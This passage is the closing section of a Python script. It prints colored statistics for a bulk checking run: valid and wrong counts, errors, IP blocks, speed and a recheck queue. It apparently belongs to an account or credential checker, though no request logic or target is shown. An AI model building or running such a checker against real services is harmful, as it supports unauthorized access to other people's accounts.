    print(f"Total Checked: {stats['total_checked']:,}")
    print(f"{Colors.GREEN}✅ Valid: {stats['valid']}{Colors.RESET}")
    print(f"{Colors.RED}❌ Wrong: {stats['wrong']}{Colors.RESET}")
    print(f"{Colors.MAGENTA}⚠️ Errors: {stats['errors']}{Colors.RESET}")
    print(f"{Colors.YELLOW}🚫 IP Blocks: {stats['ip_blocks']}{Colors.RESET}")
    print(f"Speed: {stats['total_checked']/elapsed:.1f}/sec")
    print(f"\n{Colors.CYAN}🔄 RECHECK STATS:{Colors.RESET}")
    print(f"   Total Queued: {recheck_stats['total']}")
    print(f"   Resolved → Valid: {recheck_stats['resolved_valid']}")
    print(f"   Resolved → Wrong: {recheck_stats['resolved_wrong']}")
    print(f"   Still Pending: {recheck_stats['still_pending']}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

if __name__ == "__main__":
    main()